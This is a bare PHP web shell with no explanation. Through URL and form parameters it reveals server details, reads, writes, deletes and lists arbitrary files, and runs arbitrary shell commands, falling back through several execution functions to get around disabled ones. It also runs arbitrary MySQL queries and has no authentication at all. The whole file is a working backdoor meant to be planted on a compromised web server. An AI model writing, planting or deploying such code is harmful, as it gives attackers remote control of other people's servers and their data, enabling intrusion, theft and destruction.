<?php
$a=$_GET['a']??'';$p=$_GET['p']??'';$d=$_POST['d']??'';
header('Content-Type: text/plain');
if(!$a)exit;
switch($a){
case 'info':echo"USER=".get_current_user()."\nCWD=".getcwd()."\nPHP=".PHP_VERSION."\nOPEN_BASEDIR=".ini_get('open_basedir')."\nDISABLED=".ini_get('disable_functions')."\nDOCROOT=".($_SERVER['DOCUMENT_ROOT']??'?')."\n";break;
case 'read':echo@file_get_contents($p);break;
case 'write':echo@file_put_contents($p,base64_decode($d))!==false?'OK':'FAIL';break;
case 'del':echo@unlink($p)?'OK':'FAIL';break;
case 'ls':$f=@scandir($p?:'.');echo$f?implode("\n",$f):'ERROR';break;
case 'isdir':echo is_dir($p)?'1':'0';break;
case 'exec':$c=$_GET['cmd']??'';if(!$c){echo'No cmd';break;}
  $r='';$o=[];$rc=-1;
  if(function_exists('exec')){exec($c,$o,$rc);$r=implode("\n",$o);}
  elseif(function_exists('shell_exec')){$r=@shell_exec($c);}
  elseif(function_exists('system')){ob_start();@system($c);$r=ob_get_clean();}
  elseif(function_exists('passthru')){ob_start();@passthru($c);$r=ob_get_clean();}
  elseif(function_exists('popen')){$h=@popen($c,'r');if($h){$r=@fread($h,8192);@pclose($h);}}
  elseif(is_resource(@fopen("/proc/".getmypid()."/fd/1","w"))){$r='NO_EXEC_FUNCS';}
  else{$r='NO_EXEC_FUNCS';}
  echo$r!==''?$r:'(empty)';break;
case 'mysql':$q=$_POST['q']??'';$h=$_POST['h']??'localhost';$u=$_POST['u']??'root';$pw=$_POST['pw']??'';$db=$_POST['db']??'';
  $conn=@new mysqli($h,$u,$pw,$db?:'');if($conn->connect_error){echo'ERR:'.$conn->connect_error;break;}
  $res=$conn->query($q);if($res===true){echo'OK rows='.$conn->affected_rows;break;}
  if($res===false){echo'ERR:'.$conn->error;break;}
  $rows=[];while($row=$res->fetch_assoc())$rows[]=json_encode($row);echo implode("\n",$rows);$conn->close();break;
}exit;?>